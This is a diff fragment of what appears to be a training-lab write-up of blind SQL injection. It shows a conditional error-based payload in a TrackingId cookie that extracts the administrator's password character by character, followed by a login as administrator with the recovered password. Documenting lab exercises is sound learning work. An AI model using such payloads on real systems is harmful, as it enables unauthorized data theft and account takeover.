@@ -127,3 +127,11 @@ ATTEMPT-2
 ATTEMPT-20
 ⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
 ⦁	Output: n36xq65pht3u7lym6obn
+
+*****Obtaining escalated privileges by logging into the admin account******
+
+ATTEMPT-1
+⦁	Input: Username: administrator
+          Password: n36xq65pht3u7lym6obn
+⦁	Output: Welcome administrator
+⦁Lesson Learned: Sensitive account credentials can be used for privilege escalation
